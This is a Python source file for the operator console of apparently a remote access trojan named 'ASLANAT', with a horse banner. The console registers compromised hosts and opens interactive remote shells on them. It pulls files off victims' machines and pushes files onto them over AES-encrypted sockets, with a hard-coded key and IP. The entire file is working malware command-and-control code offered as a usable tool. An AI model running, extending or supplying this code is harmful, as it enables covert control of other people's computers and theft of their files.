import socket
import threading
import json
import os
import time
import sys
import logging
from tabulate import tabulate
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import ThreadedFTPServer
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad

Host = "192.168.140.65"
Port = 6565
client_list=[]
address_list = []
aes_key = b'o\x802\x0ez\xe0\x8f\x8b\xc7>\xbf\x9fce\x85\xd3'




class colour:
    CC = "\033[34mASLANAT\033[0m"
    help = "\033[34m(help/?)\033[0m"
    arrow = "\033[35m>\033[33m"
    def NickName(f):
        return f"\033[34m{f}\033[0m"
    
    def Path(f):
        return f"\033[31m{f}\033[0m"
    
    def info(f):
        return f"\033[32m{f}\033[0m"



HELP = """
COMMANDS    Usage                            DESCRIPTION
---------   ------------------------------   -----------
connect     connect <NickName>               Connect to Spesific Host
            close                            Close Connection
            ftp <-d/-u> <data>               FTP server has two option -d, -u
                -d                           Download file from client to ./Data/ftp folder
                -u                           Upload file from ./Data/ftp folder to pwd
list        list                             Show all Hosts
nick        nick <HostName> <New NickName>   Assign or Change NickName
history     history                          Show Command History
            history <HostName>               Show Command History Used in Spesific Host
start       start <NickName>                 Start Connection
stop        stop <NickName>                  Stop Connection
clear       clear                            Clear Terminal
exit        exit                             Stop Server
"""


HORSE ="""
⠀⠀⠀⠀⠀⠀⢀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⣦⡀⠘⣆⠈⠛⠻⣗⠶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠈⠳⠄⠀⠈⠙⠶⣍⡻⢿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠻⣮⡹⣿⣿⣷⣦⣄⣀⠀⠀⢀⣸⠃⠀⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣮⢿⣿⣿⣿⣿⣿⣿⣿⠟⠀⢰⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣾⣿⠀⠀⠀⠀⠀⠀⠀⣷⠀⢷⠀⠀⠀⠙⢷⣿⣿⣿⣿⣟⣋⣀⣤⣴⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⢿⣿⡀⠀⠀⢀⣀⣴⣾⡟⠀⠈⣇⠀⠀⠀⠈⢻⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⡏⠸⣿⣿⣶⣾⣿⡿⠟⠋⠀⠀⠀⢹⡆⠀⠀⠀⠀⠹⡽⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⠀⠀⠀⣀⡿⠛⠉⠀⠀⢿⠀⠀⠀⠘⣿⡄⠀⠀⠀⠀⠑⢹⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣷⣶⣾⠏⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⡿⠃⠀⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⢀⠀⠹⣿⣿⣿⣿⣷⣶⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⢸⣿⠀⠀⠀⠀⢀⡞⠀⠀⠈⠛⠻⠿⠿⠯⠥⠤⢄⣀⣀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠀⠀⠀⢸⡇⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠈⠙⠂⠙⠳⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠇⠀⠀⠀⡾⠁⠀⠀⣠⡿⠃⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠀⠀⠀⡸⠃⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠇⠀⠀⠀⠃⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠏⠀⠀⠀⠀⣰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠙⠻⣿⣿⣿⣿⣿⣿⣦⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⢀⡖⢰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠟⠀⠀⠀⢸⣿⠀⠀⠈⢿⣿⣿⣿⣿⣿⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⣼⠁⠼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⣼⡇⠀⠀⣠⣾⣿⣿⣿⣿⠟⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠘⣇⠀⠀⢻⡄⢠⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⢀⣼⠏⠀⣠⣾⣿⣿⡿⣿⡿⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠁⠀⠘⠂⠀⠀⢳⠀⢳⡀⠀⠀⠀⠀⠀⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⠃⠀⠀⠀⠀⣠⣾⠃⣠⣾⣿⣿⠿⠋⢰⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⢀⣀⡴⠞⠙⠲⣷⡄⠀⠀⠀⠀⢠⡾⠁⠀⠀⠀⢀⣀⣠⣤⣶⠿⠟⠋⠀⡾⠀⠀⠀⢀⣴⠟⠁⢠⡟⢱⡿⠃⠀⠀⠸⣇⡀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡴⠟⠁⠀⣀⡤⠖⠋⠁⠀⠀⠀⠀⣸⠇⠀⠀⠀⣤⠟⠑⠋⠉⣿⠋⠉⠉⠉⠁⣠⠞⠀⠀⠀⡇⠀⠀⢠⡿⠋⠀⠀⠈⠁⡿⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⢀⣾⣏⣤⣶⡾⠛⠉⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⣠⠞⠁⠀⠀⠀⠀⣿⠀⠀⠀⢀⡼⠃⠀⠀⠀⢸⠇⠀⣰⠟⠀⠀⠀⠀⠀⠐⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⣿⠀⠀⢀⡾⠃⠀⠀⠀⢀⡞⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣼⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣶⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⣾⠇⠀⠀⠀⢀⣾⣣⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⢠⡟⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡄⢀⣀⡀⠀⠀⠀⠀⠀⠀⢸⡇⠀⣾⠇⠀⠀⣰⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⣾⠀⣰⠟⠀⢀⣼⣿⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠿⠿⠿⠿⠿⠃⠀⠀⠀⢸⣿⣶⠏⢀⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⠃⢠⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⢃⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣧⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡟⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⠁⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

    







def data_read():
    try:
        while data_collection:
            with open('./Data/client_list.json') as f:
                global data 
                data = json.load(f)
            time.sleep(1)
    except:
        output("[*] There is a problem in JSON data.")

def start_data_read():
    global data_collection
    data_collection = True
    data_reloader = threading.Thread(target=data_read)
    data_reloader.start()

def stop_data_read():
    global data_collection
    data_collection = False

def encrypt_data(data):
    cipher = AES.new(aes_key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(data, AES.block_size))
    return cipher.iv + ciphertext

def decrypt_data(encrypted_data):
    iv = encrypted_data[:AES.block_size]
    ciphertext = encrypted_data[AES.block_size:]
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted_data



def history_saver(command):
    with open("./Data/history.txt",'a') as history:
        history.write(f'{command}\n')

def log_saver(HostName,command):
    with open(f"./Data/log/{HostName}.txt",'a') as history:
        history.write(f'{command}\n')

def client_connected(server):
    try:
        while 1:
            sam_client, sam_address = server.accept()
            client_list.append(sam_client)
            address_list.append(sam_address)
            check_hostname(decrypt_data(sam_client.recv(1024)).decode("utf-8"),sam_client)
    except:
        print(colour.info("[*] Socket sessions closed."))
        history_saver("[*] Socket sessions closed.")


def check_hostname(HostName,client):
    userAdd = True
    for each in data['client_list']:
        if each['HostName'] == HostName:
            userAdd = False
            enc = encrypt_data(b"hello")
            client.send(enc)
    if userAdd :
        enc = encrypt_data(b"whoareyou")
        client.send(enc)
        IP = client.getpeername()[0]
        UserName = decrypt_data(client.recv(1024)).decode("utf-8")
        new_client = {
            "IP" : IP,
            "HostName" : HostName,
            "UserName" : UserName,
            "NickName" : HostName,
            "Status" : "False"
        }
        data['client_list'].append(new_client)
        with open("./Data/client_list.json","w") as f:
            json.dump(data,f,indent=4)
    output(colour.info(f"[*] {HostName} connected."))
            



def output(hello):
    sys.stdout.write(colour.info(f"\r\u001b[1000D{hello}                                         \n"))
    history_saver(hello)





def ftp(command,client):
    tip = command[1]
    file = command[2]

    def write(file,data):
        with open(file,'wb') as f:
            f.write(data)



    def read(file):
        with open(file,'rb') as f:
            return f.read() 
        

    def parse_chunks(data, chunk_size=409600):
        chunks = []
        for i in range(0, len(data), chunk_size):
            if i+ chunk_size < len(data):
                chunks.append(data[i:i + chunk_size])
            else : 
                chunks.append(data[i:len(data)])
        return chunks
    

    def download(file,client):
        size = int(client.recv(4096).decode('utf-8'))
        data = []
        if size == -1:
            return 0
        client.send(b"ready")
        for i in range(size):
            chunk = client.recv(409600)
            data.append(chunk)
        binary_data = b''.join(data)  
        write(f"./Data/ftp/{file}",binary_data)

    def upload(file,client):
        try:
            file = read(f"./Data/ftp/{file}")
            parse_file =parse_chunks(file)
            print(parse_file)
            client.send(str(len(parse_file)).encode('utf-8'))
            client.recv(409600)
            for chunk in parse_file:
                client.send(chunk)
        except:
            client.send(b'-1')
            


    if tip == "-d":
        download(file,client)
    elif tip == "-u":
        upload(file,client)




def connect(NickName):
    IP = ''
    for each in data['client_list']:
        if each['NickName'] == NickName:
            IP = each["IP"]
            HostName = each["HostName"]
    for client in client_list : 
        raddr = client.getpeername()[0] if client else None
        if raddr == IP :
            print(colour.info(f"[*] Connected to {NickName} !!"))
            history_saver(f"[*] Connected to {NickName} !!")
            command = ''
            enc = encrypt_data(b"connect")
            client.send(enc)
            while command != "close":
                pwd = decrypt_data(client.recv(40960)).decode('utf-8')
                while True:
                    command = input(f"{colour.CC} {colour.NickName('<'+NickName+'>')} {colour.Path('('+pwd+')')} {colour.arrow} ");print("\033[0m", end='')
                    log_saver(HostName,command)
                    if command == "clear" or command == "cls":
                        os.system('cls' if os.name == 'nt' else 'clear')
                    elif command.split(" ")[0] == "ftp":
                        ftp_command = command.split()
                        if len(ftp_command) == 3:
                            enc = encrypt_data(command.encode('utf-8'))
                            client.send(enc)
                            ftp(ftp_command,client)
                            output = f"{decrypt_data(client.recv(4096000)).decode('utf-8')}"
                            print(output,end="")
                            log_saver(HostName,output)
                        else:
                            print(colour.info("[*] Wrong command."))
                        break
                    elif command != "":
                        enc = encrypt_data(command.encode('utf-8'))
                        client.send(enc)
                        output = f"{decrypt_data(client.recv(4096000)).decode('utf-8')}"
                        print(output,end="")
                        log_saver(HostName,output)
                        break


def nick(HostName,NickName):
    for client in data['client_list']:
        if client["HostName"] == HostName:
            history_saver(f"[*] {HostName}'s NickName Changed as: {NickName}")
            print(colour.info(f"[*] {HostName}'s NickName Changed as: {NickName}"))
            client["NickName"] = NickName
            with open('./Data/client_list.json', 'w') as f:
                json.dump(data, f,indent=4)

def close():
    for f in client_list:
        enc = encrypt_data(b"exit")
        f.send(enc)
    server.close()
    global data_collection
    data_collection = False 
    for client in data['client_list']:
        client["Status"] = "False"
    with open('./Data/client_list.json', 'w') as f:
        json.dump(data, f,indent=4)
                       
    ### send message to client for go silent mode ###

def lists():
    data_header = data['client_list'][0].keys()
    table = f"{tabulate([list(d.values()) for d in data['client_list']], headers=data_header)}"
    history_saver(table)
    print(f"\n{table}\n")



def start(NickName):
    for client in data['client_list']:
        if client["NickName"] == NickName:
            history_saver(f"[*] {NickName}'s Status Changed as: True ")
            print(colour.info(f"[*] {NickName}'s Status Changed as: True"))
            client["Status"] = "True"
            with open('./Data/client_list.json', 'w') as f:
                json.dump(data, f,indent=4)


def stop(NickName):
    for client in data['client_list']:
        if client["NickName"] == NickName:
            history_saver(f"[*] {NickName}'s Status Changed as: False ")
            print(colour.info(f"[*] {NickName}'s Status Changed as: False"))
            client["Status"] = "False"
            IP = client["IP"]
            with open('./Data/client_list.json', 'w') as f:
                json.dump(data, f,indent=4)
    for client in client_list : 
        raddr = client.getpeername()[0] if client else None
        if raddr == IP :
            print(colour.info(f"[*] Connection closed: {NickName} !!"))
            history_saver(f"[*] Connection closed: {NickName} !!")
            enc = encrypt_data(b"close")
            client.send(enc)
        client_list.remove(client)            






if __name__ == "__main__":
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((Host,Port))
    server.listen(10)
    client_collector = threading.Thread(target=client_connected,args=(server,))
    client_collector.start()
    
    start_data_read()
    
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"\033[31m{HORSE}\033[0m")
    
    while True :
        
        command = input(f"{colour.CC} {colour.help} {colour.arrow} ");print("\033[0m",end='')
        history_saver(command)
        command = command.split(" ")

        match command[0]:

            case "connect" :
                connect(command[1])
            
            case "list" :
                lists()
            
            case "nick" :
                nick(command[1],command[2])
                
            case "exit":
                close()
                break
            
            case "clear":
                os.system('cls' if os.name == 'nt' else 'clear')

            case "history":
                with open("./Data/history.txt","r") as f:
                    print(f.read())
            
            case "help" : 
                print(HELP)
                
            case "?":
                print(HELP)

                
            case "clist":
                print(client_list)
                
            case "start":
                start(command[1])
                
            case "stop":
                stop(command[1])
                
            case _ :
                print(colour.info('[*] Command not Found'))
                print(colour.info('[*] Use help or ? for Help.'))